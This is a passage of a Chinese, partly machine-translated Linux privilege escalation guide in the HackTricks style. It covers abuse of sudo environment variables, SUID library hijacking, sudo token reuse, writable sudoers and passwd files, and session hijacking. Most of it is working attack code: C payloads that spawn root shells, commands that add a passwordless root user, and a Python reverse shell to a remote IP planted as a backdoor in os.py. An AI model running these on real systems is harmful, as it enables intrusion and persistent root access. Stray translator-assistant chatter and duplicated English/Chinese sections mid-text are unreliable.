如果 sudoers 保留了 `BASH_ENV`（例如 `Defaults env_keep+="ENV BASH_ENV"`），你可以利用 Bash 的非交互启动行为，在调用被允许的命令时以 root 身份运行任意代码。

- Why it works: 对于非交互式 shell，Bash 会评估 `$BASH_ENV` 并在运行目标脚本前 source 该文件。许多 sudo 规则允许运行脚本或 shell 包装器。如果 `BASH_ENV` 被 sudo 保留，你的文件会以 root 权限被 source。

- Requirements:
- 一个你能运行的 sudo 规则（任何以非交互方式调用 `/bin/bash` 的目标，或任何 bash 脚本）。
- `BASH_ENV` 存在于 `env_keep`（可用 `sudo -l` 检查）。

- PoC:
```bash
cat > /dev/shm/shell.sh <<'EOF'
#!/bin/bash
/bin/bash
EOF
chmod +x /dev/shm/shell.sh
BASH_ENV=/dev/shm/shell.sh sudo /usr/bin/systeminfo   # or any permitted script/binary that triggers bash
# You should now have a root shell
```
- 加固:
- 删除 `BASH_ENV`（和 `ENV`）从 `env_keep`，优先使用 `env_reset`。
- 避免为 sudo 允许的命令使用 shell wrappers；使用尽量精简的二进制文件。
- 考虑在保留的 env vars 被使用时对 sudo 的 I/O 进行日志记录和告警。

### Sudo execution bypassing paths

**跳转** 以读取其他文件或使用 **symlinks**。例如在 sudoers 文件中: _hacker10 ALL= (root) /bin/less /var/log/\*_
```bash
sudo less /var/logs/anything
less>:e /etc/shadow #Jump to read other files using privileged less
```

```bash
ln /etc/shadow /var/log/new
sudo less /var/log/new #Use symlinks to read any file
```
如果使用 **wildcard** (\*)，就更简单了：
```bash
sudo less /var/log/../../etc/shadow #Read shadow
sudo less /var/log/something /etc/shadow #Red 2 files
```
**缓解措施**: [https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/](https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/)

### Sudo 命令/SUID 二进制文件 未指定命令路径

如果将 **sudo 权限** 授予单个命令 **未指定路径**：_hacker10 ALL= (root) less_，你可以通过更改 PATH 变量来利用它。
```bash
export PATH=/tmp:$PATH
#Put your backdoor in /tmp and name it "less"
sudo less
```
该技术也可用于当一个 **suid** 二进制 **在执行另一个命令时没有指定其路径（务必使用** _**strings**_ **检查可疑 SUID 二进制的内容）**。

[Payload examples to execute.](payloads-to-execute.md)

### SUID 二进制带命令路径

如果 **suid** 二进制 **执行另一个命令并指定了路径**，那么你可以尝试**导出一个函数**，其名称与 suid 文件调用的命令相同。

例如，如果一个 **suid** 二进制调用 _**/usr/sbin/service apache2 start**_，你需要尝试创建该函数并导出它：
```bash
function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
export -f /usr/sbin/service
```
然后，当你调用该 suid 二进制文件时，该函数将被执行

### LD_PRELOAD & **LD_LIBRARY_PATH**

**LD_PRELOAD** 环境变量用于指定一个或多个共享库（.so 文件），这些库会被加载器在其他库之前加载，包括标准 C 库（`libc.so`）。这个过程称为预加载库。

但是，为了维护系统安全并防止该功能被滥用，特别是在 **suid/sgid** 可执行文件中，系统会强制执行某些条件：

- 当可执行文件的真实用户 ID (_ruid_) 与有效用户 ID (_euid_) 不匹配时，加载器会忽略 **LD_PRELOAD**。
- 对于具有 suid/sgid 的可执行文件，只有位于标准路径且同样具有 suid/sgid 的库会被预加载。

如果你能够使用 `sudo` 执行命令，且 `sudo -l` 的输出包含语句 **env_keep+=LD_PRELOAD**，则可能发生权限提升。该配置允许 **LD_PRELOAD** 环境变量在使用 `sudo` 运行命令时仍然保留并被识别，可能导致以提升的权限执行任意代码。
```
Defaults        env_keep += LD_PRELOAD
```
保存为 **/tmp/pe.c**
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
```
然后 **编译它** 使用:
```bash
cd /tmp
gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
最后，**escalate privileges** 运行
```bash
sudo LD_PRELOAD=./pe.so <COMMAND> #Use any command you can run with sudo
```
> [!CAUTION]
> 如果攻击者控制了 **LD_LIBRARY_PATH** env variable，就可以滥用类似的 privesc，因为他控制了库将被搜索的路径。
```c
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
unsetenv("LD_LIBRARY_PATH");
setresuid(0,0,0);
system("/bin/bash -p");
}
```

```bash
# Compile & execute
cd /tmp
gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
sudo LD_LIBRARY_PATH=/tmp <COMMAND>
```
### SUID Binary – .so injection

当遇到具有 **SUID** 权限且显得异常的二进制文件时，最好检查它是否正确加载 **.so** 文件。可以通过运行以下命令来检查：
```bash
strace <SUID-BINARY> 2>&1 | grep -i -E "open|access|no such file"
```
例如，遇到像 _"open(“/path/to/.config/libcalc.so”, O_RDONLY) = -1 ENOENT (No such file or directory)"_ 这样的错误，可能表明存在 exploitation 的可能性。

要 exploit 这一问题，可以通过创建一个 C 文件，例如 _"/path/to/.config/libcalc.c"_, 包含以下代码：
```c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject(){
system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
```
这段代码在被编译并执行后，旨在通过修改文件权限并执行具有提升权限的 shell 来提升权限。

将上述 C 文件编译为共享对象 (.so) 文件，命令如下：
```bash
gcc -shared -o /path/to/.config/libcalc.so -fPIC /path/to/.config/libcalc.c
```
最后，运行受影响的 SUID binary 应该会触发 exploit，从而可能导致系统被攻破。

## Shared Object Hijacking
```bash
# Lets find a SUID using a non-standard library
ldd some_suid
something.so => /lib/x86_64-linux-gnu/something.so

# The SUID also loads libraries from a custom location where we can write
readelf -d payroll  | grep PATH
0x000000000000001d (RUNPATH)            Library runpath: [/development]
```
既然我们已经找到一个会从我们可以写入的文件夹加载库的 SUID binary，现在就在该文件夹中创建具有必要名称的库：
```c
//gcc src.c -fPIC -shared -o /development/libshared.so
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
setresuid(0,0,0);
system("/bin/bash -p");
}
```
如果你遇到如下错误：
```shell-session
./suid_bin: symbol lookup error: ./suid_bin: undefined symbol: a_function_name
```
这意味着你生成的库需要包含一个名为 `a_function_name` 的函数。

### GTFOBins

[**GTFOBins**](https://gtfobins.github.io) 是一个精心整理的 Unix 二进制文件列表，攻击者可以利用这些文件绕过本地安全限制。[**GTFOArgs**](https://gtfoargs.github.io/) 则针对只能在命令中**注入参数**的场景。

该项目收集了 Unix 二进制文件的合法功能，这些功能可能被滥用以突破受限 shells、提升或维持更高权限、传输文件、生成 bind and reverse shells，并辅助其他 post-exploitation 任务。

> gdb -nx -ex '!sh' -ex quit\
> sudo mysql -e '! /bin/sh'\
> strace -o /dev/null /bin/sh\
> sudo awk 'BEGIN {system("/bin/sh")}'


{{#ref}}
https://gtfobins.github.io/
{{#endref}}


{{#ref}}
https://gtfoargs.github.io/
{{#endref}}

### FallOfSudo

如果你可以运行 `sudo -l`，可以使用工具 [**FallOfSudo**](https://github.com/CyberOne-Security/FallofSudo) 来检查它是否能找到利用任何 sudo 规则的方法。

### 重用 Sudo 令牌

在你拥有 **sudo access** 但不知道密码的情况下，你可以通过 **等待某次 sudo 命令执行，然后劫持会话 token** 来提升权限。

提升权限的前提条件：

- 你已经以用户 _sampleuser_ 的身份获得了一个 shell
- _sampleuser_ 在 **最近 15mins** 内已经 **使用 `sudo`** 执行过某些命令（默认情况下 sudo token 的时效为 15 分钟，允许我们在此期间使用 `sudo` 而不输入密码）
- `cat /proc/sys/kernel/yama/ptrace_scope` 的值为 0
- `gdb` 可用（你可以上传它）

(You can temporarily enable `ptrace_scope` with `echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope` or permanently modifying `/etc/sysctl.d/10-ptrace.conf` and setting `kernel.yama.ptrace_scope = 0`)

If all these requirements are met, **you can escalate privileges using:** [**https://github.com/nongiach/sudo_inject**](https://github.com/nongiach/sudo_inject)

- The **first exploit** (`exploit.sh`) will create the binary `activate_sudo_token` in _/tmp_. You can use it to **activate the sudo token in your session** (you won't get automatically a root shell, do `sudo su`):
```bash
bash exploit.sh
/tmp/activate_sudo_token
sudo su
```
- 第二个 **exploit** (`exploit_v2.sh`) 会在 _/tmp_ 创建一个 **由 root 拥有并带有 setuid** 的 sh shell
```bash
bash exploit_v2.sh
/tmp/sh -p
```
- 第三个 **exploit** (`exploit_v3.sh`) 会 **创建 sudoers file**，使 **sudo tokens 永久有效并允许所有用户使用 sudo**
```bash
bash exploit_v3.sh
sudo su
```
### /var/run/sudo/ts/\<Username>

如果你在该目录或其中任何已创建文件上拥有**写权限**，可以使用二进制文件 [**write_sudo_token**](https://github.com/nongiach/sudo_inject/tree/master/extra_tools) 来**为某个用户和 PID 创建 sudo 令牌**。\
例如，如果你可以覆盖文件 _/var/run/sudo/ts/sampleuser_，并且以该用户身份拥有 PID 为 1234 的 shell，你可以在不需要密码的情况下通过以下方式**获得 sudo 权限**：
```bash
./write_sudo_token 1234 > /var/run/sudo/ts/sampleuser
```
### /etc/sudoers, /etc/sudoers.d

文件 `/etc/sudoers` 以及 `/etc/sudoers.d` 目录下的文件用于配置谁可以使用 `sudo` 以及如何使用。 这些文件**默认只能由用户 root 和组 root 读取**.\\
**如果**你能**读取**该文件，可能能够**获取一些有价值的信息**；而如果你能**写入**任意文件，则可以**提升权限**。
```bash
ls -l /etc/sudoers /etc/sudoers.d/
ls -ld /etc/sudoers.d/
```
如果你有写权限，就能滥用该权限
```bash
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers.d/README
```
另一种滥用这些权限的方法：
```bash
# makes it so every terminal can sudo
echo "Defaults !tty_tickets" > /etc/sudoers.d/win
# makes it so sudo never times out
echo "Defaults timestamp_timeout=-1" >> /etc/sudoers.d/win
```
### DOAS

有一些可以替代 `sudo` 二进制的工具，例如 OpenBSD 的 `doas`，请记得检查其配置文件 `/etc/doas.conf`。
```
permit nopass demo as root cmd vim
```
### Sudo Hijacking

如果你知道某个**user通常连接到一台机器并使用 `sudo`** 来提升权限，并且你已经在该user上下文中获得了一个shell，你可以**创建一个新的sudo可执行文件**，该文件会以root身份先执行你的代码，然后再执行该user的命令。然后，**修改 $PATH** 在该user上下文中（例如在 .bash_profile 中添加新的路径），这样当该user执行 sudo 时，就会运行你的 sudo 可执行文件。

注意，如果该user使用不同的shell（不是 bash），你需要修改其他文件来添加新的路径。例如[ sudo-piggyback](https://github.com/APTy/sudo-piggyback) 修改了 `~/.bashrc`, `~/.zshrc`, `~/.bash_profile`。你可以在 [bashdoor.py](https://github.com/n00py/pOSt-eX/blob/master/empire_modules/bashdoor.py) 找到另一个例子。

或者运行类似的命令：
```bash
cat >/tmp/sudo <<EOF
#!/bin/bash
/usr/bin/sudo whoami > /tmp/privesc
/usr/bin/sudo "\$@"
EOF
chmod +x /tmp/sudo
echo ‘export PATH=/tmp:$PATH’ >> $HOME/.zshenv # or ".bashrc" or any other

# From the victim
zsh
echo $PATH
sudo ls
```
## 共享库

### ld.so

文件 `/etc/ld.so.conf` 指示 **已加载配置文件来自何处**。通常，该文件包含以下路径：`include /etc/ld.so.conf.d/*.conf`

这意味着会读取 `/etc/ld.so.conf.d/*.conf` 中的配置文件。该配置文件**指向其他文件夹**，系统将在这些文件夹中**搜索**库。例如，`/etc/ld.so.conf.d/libc.conf` 的内容是 `/usr/local/lib`。**这意味着系统会在 `/usr/local/lib` 中搜索库**。

如果因为某些原因**用户对以下任一路径有写权限**：`/etc/ld.so.conf`、`/etc/ld.so.conf.d/`、`/etc/ld.so.conf.d/` 中的任意文件或 `/etc/ld.so.conf.d/*.conf` 中配置文件指向的任何文件夹，他可能能够提升权限。\
查看以下页面，了解**如何利用此错误配置**：


{{#ref}}
ld.so.conf-example.md
{{#endref}}

### RPATH
```
level15@nebula:/home/flag15$ readelf -d flag15 | egrep "NEEDED|RPATH"
0x00000001 (NEEDED)                     Shared library: [libc.so.6]
0x0000000f (RPATH)                      Library rpath: [/var/tmp/flag15]

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x0068c000)
libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x005bb000)
```
将 lib 复制到 `/var/tmp/flag15/` 后，程序会在该位置按 `RPATH` 变量的指定使用它。
```
level15@nebula:/home/flag15$ cp /lib/i386-linux-gnu/libc.so.6 /var/tmp/flag15/

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x005b0000)
libc.so.6 => /var/tmp/flag15/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x00737000)
```
然后在 `/var/tmp` 中使用 `gcc -fPIC -shared -static-libgcc -Wl,--version-script=version,-Bstatic exploit.c -o libc.so.6` 创建一个恶意库。
```c
#include<stdlib.h>
#define SHELL "/bin/sh"

int __libc_start_main(int (*main) (int, char **, char **), int argc, char ** ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (* stack_end))
{
char *file = SHELL;
char *argv[] = {SHELL,0};
setresuid(geteuid(),geteuid(), geteuid());
execve(file,argv,0);
}
```
## 能力

Linux capabilities 提供进程**可用 root 特权的子集**。这会将 root 的**特权拆分为更小且独立的单元**。这些单元可以被单独授予进程。这样可以减少完整的特权集，从而降低被利用的风险。\
阅读以下页面以**了解更多关于 capabilities 以及如何滥用它们**：


{{#ref}}
linux-capabilities.md
{{#endref}}

## 目录权限

在目录中，**“execute” 位**表示受影响的用户可以“cd”进入该文件夹。\
**“read” 位**表示用户可以**列出**这些**文件**，而**“write” 位**表示用户可以**删除**并**创建**新的**文件**。

## ACLs

Access Control Lists (ACLs) 表示自主权限的第二层，能够**覆盖传统的 ugo/rwx 权限**。这些权限通过允许或拒绝对特定（非所有者或非所属组）用户的权限来增强对文件或目录访问的控制。此级别的**粒度确保更精确的访问管理**。更多细节请见 [**here**](https://linuxconfig.org/how-to-manage-acls-on-linux)。

**授予** 用户 "kali" 对文件的读写权限：
```bash
setfacl -m u:kali:rw file.txt
#Set it in /etc/sudoers or /etc/sudoers.d/README (if the dir is included)

setfacl -b file.txt #Remove the ACL of the file
```
**获取** 系统中具有特定 ACLs 的文件:
```bash
getfacl -t -s -R -p /bin /etc /home /opt /root /sbin /usr /tmp 2>/dev/null
```
## 打开 shell 会话

在 **旧版本** 中，你可能可以 **hijack** 其他用户的某些 **shell** 会话（**root**）。\  
在 **最新版本** 中，你将只能 **connect** 到仅属于 **你自己的用户** 的 screen sessions。然而，你可能会在会话内部发现 **有趣的信息**。

### screen sessions hijacking

**列出 screen sessions**
```bash
screen -ls
screen -ls <username>/ # Show another user' screen sessions
```
![](<../../images/image (141).png>)

**附加到会话**
```bash
screen -dr <session> #The -d is to detach whoever is attached to it
screen -dr 3350.foo #In the example of the image
screen -x [user]/[session id]
```
## tmux sessions hijacking

这是一个与 **旧的 tmux 版本** 有关的问题。我无法以非特权用户身份 hijack 由 root 创建的 tmux (v2.1) 会话。

**列出 tmux 会话**
```bash
tmux ls
ps aux | grep tmux #Search for tmux consoles not using default folder for sockets
tmux -S /tmp/dev_sess ls #List using that socket, you can start a tmux session in that socket with: tmux -S /tmp/dev_sess
```
![](<../../images/image (837).png>)

**附加到会话**
```bash
tmux attach -t myname #If you write something in this session it will appears in the other opened one
tmux attach -d -t myname #First detach the session from the other console and then access it yourself

ls -la /tmp/dev_sess #Check who can access it
rw-rw---- 1 root devs 0 Sep  1 06:27 /tmp/dev_sess #In this case root and devs can
# If you are root or devs you can access it
tmux -S /tmp/dev_sess attach -t 0 #Attach using a non-default tmux socket
```
Check **Valentine box from HTB** for an example.

## SSH

### Debian OpenSSL Predictable PRNG - CVE-2008-0166

在 2006 年 9 月至 2008 年 5 月 13 日之间，在基于 Debian 的系统（Ubuntu, Kubuntu, 等）上生成的所有 SSL 和 SSH 密钥可能受此漏洞影响。\
该漏洞在这些操作系统创建新的 ssh 密钥时出现，原因是 **只有 32,768 种变体可用**。这意味着可以计算出所有可能的组合，并且 **有了 ssh 公钥就可以搜索对应的私钥**。已计算出的可能性可在此处找到： https://github.com/g0tmi1k/debian-ssh

### SSH 有趣的配置值

- **PasswordAuthentication:** 指定是否允许密码认证。默认是 `no`。
- **PubkeyAuthentication:** 指定是否允许公钥认证。默认是 `yes`。
- **PermitEmptyPasswords**: 当允许密码认证时，指定服务器是否允许使用空密码字符串的账户登录。默认是 `no`。

### PermitRootLogin

指定是否允许 root 使用 ssh 登录，默认是 `no`。可能的取值：

- `yes`: root 可以使用密码和私钥登录
- `without-password` or `prohibit-password`: root 只能使用私钥登录
- `forced-commands-only`: root 仅能使用私钥登录，且必须指定 commands 选项
- `no` : 不允许

### AuthorizedKeysFile

指定包含可用于用户认证的公钥的文件。它可以包含类似 `%h` 的标记，该标记会被替换为主目录。**你可以指定绝对路径**（以 `/` 开头）或**相对于用户主目录的相对路径**。例如：
```bash
AuthorizedKeysFile    .ssh/authorized_keys access
```
该配置将表明，如果你尝试使用用户 "**testusername**" 的 **private** key 登录，ssh 会将你的 key 的公钥与位于 `/home/testusername/.ssh/authorized_keys` 和 `/home/testusername/access` 的公钥进行比较。

### ForwardAgent/AllowAgentForwarding

SSH agent forwarding 允许你 **use your local SSH keys instead of leaving keys** (without passphrases!)，不必把 keys 放在服务器上。因此，你可以通过 ssh **jump** **to a host**，然后从那里 **jump to another** **host**，**using** 放在你 **initial host** 上的 **key**。

你需要在 `$HOME/.ssh.config` 中设置此选项，像这样：
```
Host example.com
ForwardAgent yes
```
Notice that if `Host` is `*` every time the user jumps to a different machine, that host will be able to access the keys (which is a security issue).

注意，如果 `Host` 是 `*`，每次用户跳到不同的机器时，该主机都能访问密钥（这会带来安全问题）。

The file `/etc/ssh_config` can **override** this **options** and allow or denied this configuration.\
The file `/etc/sshd_config` can **allow** or **denied** ssh-agent forwarding with the keyword `AllowAgentForwarding` (default is allow).

文件 `/etc/ssh_config` 可以**覆盖**这些**选项**并允许或拒绝此配置。\
文件 `/etc/sshd_config` 可以通过关键字 `AllowAgentForwarding` **允许**或**拒绝** ssh-agent forwarding（默认允许）。

If you find that Forward Agent is configured in an environment read the following page as **you may be able to abuse it to escalate privileges**:


{{#ref}}
ssh-forward-agent-exploitation.md
{{#endref}}

如果你发现在某个环境中配置了 Forward Agent，请阅读以下页面，因为**你可能能够滥用它来提升权限**：


{{#ref}}
ssh-forward-agent-exploitation.md
{{#endref}}

## Interesting Files

### Profiles files

The file `/etc/profile` and the files under `/etc/profile.d/` are **scripts that are executed when a user runs a new shell**. Therefore, if you can **write or modify any of them you can escalate privileges**.

## Interesting Files

### Profiles files

文件 `/etc/profile` 以及 `/etc/profile.d/` 下的文件是**在用户启动新 shell 时执行的脚本**。因此，如果你能够**写入或修改其中任何一个，你就可以提升权限**。
```bash
ls -l /etc/profile /etc/profile.d/
```
如果发现任何可疑的 profile script，你应该检查其中是否包含 **敏感信息**。

### Passwd/Shadow Files

根据操作系统，`/etc/passwd` 和 `/etc/shadow` 文件可能使用不同的名字，或者可能存在备份。因此建议 **找到所有这些文件** 并 **检查是否可以读取**，以查看文件中是否包含 **哈希**：
```bash
#Passwd equivalent files
cat /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
#Shadow equivalent files
cat /etc/shadow /etc/shadow- /etc/shadow~ /etc/gshadow /etc/gshadow- /etc/master.passwd /etc/spwd.db /etc/security/opasswd 2>/dev/null
```
在某些情况下，你可以在 `/etc/passwd`（或等效）文件中找到 **password hashes**
```bash
grep -v '^[^:]*:[x\*]' /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
```
### 可写的 /etc/passwd

首先，使用以下命令之一生成一个 password。
```
openssl passwd -1 -salt hacker hacker
mkpasswd -m SHA-512 hacker
python2 -c 'import crypt; print crypt.crypt("hacker", "$6$salt")'
```
我需要你先把 src/linux-hardening/privilege-escalation/README.md 的内容贴过来，我才能进行翻译并保留原有的 Markdown/标签格式。

关于“然后添加用户 `hacker` 并添加生成的密码”这一点，请确认：
- 是否希望我在翻译后的文件中追加创建用户的命令示例（例如 useradd / adduser）？
- 需要生成的密码长度和字符规则（例如 12 位，包含大小写字母、数字和符号）？

把文件内容和你的偏好告诉我后我就开始翻译并添加用户/密码。
```
hacker:GENERATED_PASSWORD_HERE:0:0:Hacker:/root:/bin/bash
```
例如: `hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:Hacker:/root:/bin/bash`

现在你可以使用 `su` 命令并使用 `hacker:hacker`

或者，你可以使用以下几行添加一个无密码的虚拟用户。\\
警告：这可能会降低机器当前的安全性。
```
echo 'dummy::0:0::/root:/bin/bash' >>/etc/passwd
su - dummy
```
注意：在 BSD 平台上，`/etc/passwd` 位于 `/etc/pwd.db` 和 `/etc/master.passwd`，同时 `/etc/shadow` 被重命名为 `/etc/spwd.db`。

你应该检查是否可以 **写入一些敏感文件**。例如，你是否能写入某些 **服务配置文件**？
```bash
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' 2>/dev/null | grep -v '/proc/' | grep -v $HOME | sort | uniq #Find files owned by the user or writable by anybody
for g in `groups`; do find \( -type f -or -type d \) -group $g -perm -g=w 2>/dev/null | grep -v '/proc/' | grep -v $HOME; done #Find files writable by any group of the user
```
例如，如果机器正在运行 **tomcat** 服务器，且你可以 **修改位于 /etc/systemd/ 的 Tomcat 服务配置文件，** 那么你可以修改以下几行：
```
ExecStart=/path/to/backdoor
User=root
Group=root
```
你的 backdoor 将在下一次 tomcat 启动时被执行。

### 检查文件夹

The following folders may contain backups or interesting information: **/tmp**, **/var/tmp**, **/var/backups, /var/mail, /var/spool/mail, /etc/exports, /root** (可能你无法读取最后一个，但可以尝试)
```bash
ls -a /tmp /var/tmp /var/backups /var/mail/ /var/spool/mail/ /root
```
### 奇怪的位置/Owned files
```bash
#root owned files in /home folders
find /home -user root 2>/dev/null
#Files owned by other users in folders owned by me
for d in `find /var /etc /home /root /tmp /usr /opt /boot /sys -type d -user $(whoami) 2>/dev/null`; do find $d ! -user `whoami` -exec ls -l {} \; 2>/dev/null; done
#Files owned by root, readable by me but not world readable
find / -type f -user root ! -perm -o=r 2>/dev/null
#Files owned by me or world writable
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
#Writable files by each group I belong to
for g in `groups`;
do printf "  Group $g:\n";
find / '(' -type f -or -type d ')' -group $g -perm -g=w ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
done
done
```
### 最近几分钟修改的文件
```bash
find / -type f -mmin -5 ! -path "/proc/*" ! -path "/sys/*" ! -path "/run/*" ! -path "/dev/*" ! -path "/var/lib/*" 2>/dev/null
```
### Sqlite DB 文件
```bash
find / -name '*.db' -o -name '*.sqlite' -o -name '*.sqlite3' 2>/dev/null
```
### \*\_history, .sudo_as_admin_successful, profile, bashrc, httpd.conf, .plan, .htpasswd, .git-credentials, .rhosts, hosts.equiv, Dockerfile, docker-compose.yml 文件
```bash
find / -type f \( -name "*_history" -o -name ".sudo_as_admin_successful" -o -name ".profile" -o -name "*bashrc" -o -name "httpd.conf" -o -name "*.plan" -o -name ".htpasswd" -o -name ".git-credentials" -o -name "*.rhosts" -o -name "hosts.equiv" -o -name "Dockerfile" -o -name "docker-compose.yml" \) 2>/dev/null
```
### 隐藏文件
```bash
find / -type f -iname ".*" -ls 2>/dev/null
```
### **PATH 中的脚本/二进制**
```bash
for d in `echo $PATH | tr ":" "\n"`; do find $d -name "*.sh" 2>/dev/null; done
for d in `echo $PATH | tr ":" "\n"`; do find $d -type f -executable 2>/dev/null; done
```
### **Web 文件**
```bash
ls -alhR /var/www/ 2>/dev/null
ls -alhR /srv/www/htdocs/ 2>/dev/null
ls -alhR /usr/local/www/apache22/data/
ls -alhR /opt/lampp/htdocs/ 2>/dev/null
```
### **备份**
```bash
find /var /etc /bin /sbin /home /usr/local/bin /usr/local/sbin /usr/bin /usr/games /usr/sbin /root /tmp -type f \( -name "*backup*" -o -name "*\.bak" -o -name "*\.bck" -o -name "*\.bk" \) 2>/dev/null
```
### 已知包含密码的文件

查看 [**linPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS) 的代码，它会搜索 **可能包含密码的若干文件**。\
**另一个有趣的工具** 是： [**LaZagne**](https://github.com/AlessandroZ/LaZagne)，它是一个开源应用程序，用于检索存储在本地计算机上的大量密码，适用于 Windows、Linux 和 Mac。

### 日志

如果你可以读取日志，可能会在其中找到 **有趣/机密的信息**。日志越奇怪，可能越有价值（大概率）。\
此外，一些配置“**糟糕**”（或已被后门植入？）的 **audit logs** 可能允许你在审计日志中**记录密码**，正如这篇文章所解释的： [https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/](https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/).
```bash
aureport --tty | grep -E "su |sudo " | sed -E "s,su|sudo,${C}[1;31m&${C}[0m,g"
grep -RE 'comm="su"|comm="sudo"' /var/log* 2>/dev/null
```
要查看日志，**读取日志的组** [**adm**](interesting-groups-linux-pe/index.html#adm-group) 会非常有帮助。

### Shell 文件
```bash
~/.bash_profile # if it exists, read it once when you log in to the shell
~/.bash_login # if it exists, read it once if .bash_profile doesn't exist
~/.profile # if it exists, read once if the two above don't exist
/etc/profile # only read if none of the above exists
~/.bashrc # if it exists, read it every time you start a new shell
~/.bash_logout # if it exists, read when the login shell exits
~/.zlogin #zsh shell
~/.zshrc #zsh shell
```
### Generic Creds Search/Regex

你还应检查文件名（**名称**）或文件内容（**内容**）中是否包含词 **password**，并检查日志中是否有 IPs、emails，或 hashes regexps.\
这里我不会列出所有具体做法，但如果你有兴趣，可以查看 [**linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/linpeas.sh) 执行的最后一些检查。

## Writable files

### Python library hijacking

如果你知道从**哪里**将执行某个 python 脚本，且你**可以在该文件夹写入**或可以**修改 python libraries**，你就可以修改 OS library 并在其中植入后门（如果你可以写入 python 脚本将被执行的位置，复制并粘贴 os.py library）。

To **backdoor the library** just add at the end of the os.py library the following line (change IP and PORT):
```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.14",5678));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```
### Logrotate 漏洞利用

A vulnerability in `logrotate` lets users with **write permissions** on a log file or its parent directories potentially gain escalated privileges. This is because `logrotate`, often running as **root**, can be manipulated to execute arbitrary files, especially in directories like _**/etc/bash_completion.d/**_. It's important to check permissions not just in _/var/log_ but also in any directory where log rotation is applied.

> [!TIP]
> 该漏洞影响 `logrotate` 版本 `3.18.0` 及更早版本

More detailed information about the vulnerability can be found on this page: [https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition).

You can exploit this vulnerability with [**logrotten**](https://github.com/whotwagner/logrotten).

This vulnerability is very similar to [**CVE-2016-1247**](https://www.cvedetails.com/cve/CVE-2016-1247/) **(nginx logs),** so whenever you find that you can alter logs, check who is managing those logs and check if you can escalate privileges substituting the logs by symlinks.

### /etc/sysconfig/network-scripts/ (Centos/Redhat)

**漏洞参考：** [**https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f**](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)

If, for whatever reason, a user is able to **write** an `ifcf-<whatever>` script to _/etc/sysconfig/network-scripts_ **or** it can **adjust** an existing one, then your **system is pwned**.

Network scripts, _ifcg-eth0_ for example are used for network connections. They look exactly like .INI files. However, they are \~sourced\~ on Linux by Network Manager (dispatcher.d).

In my case, the `NAME=` attributed in these network scripts is not handled correctly. If you have **white/blank space in the name the system tries to execute the part after the white/blank space**. This means that **everything after the first blank space is executed as root**.

For example: _/etc/sysconfig/network-scripts/ifcfg-1337_
```bash
NAME=Network /bin/id
ONBOOT=yes
DEVICE=eth0
```
(_注意 Network 和 /bin/id 之间的空格_)

### **init, init.d, systemd, and rc.d**

目录 `/etc/init.d` 存放 System V init (SysVinit) 的 **脚本**，这是 **经典的 Linux 服务管理系统**。它包含用于 `start`、`stop`、`restart`，有时还有 `reload` 服务的脚本。这些脚本可以直接执行，或者通过位于 `/etc/rc?.d/` 的符号链接来调用。Redhat 系统的另一路径为 `/etc/rc.d/init.d`。

另一方面，`/etc/init` 与 **Upstart** 相关，Upstart 是 Ubuntu 引入的较新的 **服务管理** 机制，使用配置文件来管理服务。尽管已经引入了 Upstart，但由于 Upstart 中的兼容层，仍会并行使用 SysVinit 脚本。

**systemd** 是一种现代的初始化和服务管理器，提供按需启动守护进程、automount 管理以及系统状态快照等高级功能。它将文件组织在 `/usr/lib/systemd/`（发行版包）和 `/etc/systemd/system/`（管理员修改）中，从而简化系统管理流程。

## 其他技巧

### NFS Privilege escalation


{{#ref}}
nfs-no_root_squash-misconfiguration-pe.md
{{#endref}}

### 从受限 Shells 中逃逸


{{#ref}}
escaping-from-limited-bash.md
{{#endref}}

### Cisco - vmanage


{{#ref}}
cisco-vmanage.md
{{#endref}}

## Android rooting frameworks: manager-channel abuse

